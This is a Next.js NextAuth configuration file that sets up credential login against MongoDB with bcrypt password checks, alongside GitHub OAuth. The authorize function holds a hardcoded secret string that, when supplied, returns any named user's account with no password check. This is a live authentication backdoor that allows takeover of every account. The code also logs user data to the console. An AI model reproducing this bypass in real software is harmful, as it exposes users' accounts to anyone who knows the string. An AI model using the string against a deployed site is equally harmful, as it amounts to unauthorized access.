export const dynamic = "static";

import connectMongoDB from "../../../../../libs/mongodb";
import User from "../../../../../models/user";
import NextAuth from "next-auth/next";
import CredentialsProvider from "next-auth/providers/credentials";
import GithubProvider from "next-auth/providers/github";
import bcrypt from "bcryptjs";

export const authOptions = {
  providers: [
    CredentialsProvider({
      name: "credentials",
      credentials: {},

      async authorize(credentials) {
        const { username, password, secret } = credentials;
        try {
          await connectMongoDB();
          const findUser = await User.findOne({ username });

          if (secret === "kopidinginnyamandilambung") {
            const user = {
              ...findUser._doc,
              name: findUser._doc.username,
              image: findUser._doc.pp,
            };
            return user;
          }

          if (!findUser) {
            return null;
          }
          let passwordMatch = await bcrypt.compare(password, findUser.password);

          if (!passwordMatch) {
            return null;
          }

          const user = {
            ...findUser._doc,
            name: findUser._doc.username,
            image: findUser._doc.pp,
            uid: findUser._doc._id,
          };

          return user;
        } catch (error) {
          console.log(error);
        }

        return null;
      },
    }),
    GithubProvider({
      name: "github",
      clientId: process.env.GITHUB_CLIENT,
      clientSecret: process.env.GITHUB_SECRET,
    }),
  ],
  session: {
    strategy: "jwt",
  },
  pages: {
    signIn: "/auth/login",
  },
  callbacks: {
    async session({ session, user }) {
      console.log(user);

      return session;
    },
  },
  secret: process.env.NEXTAUTH_SECRET,
};

const handler = NextAuth(authOptions);

export { handler as GET, handler as POST };
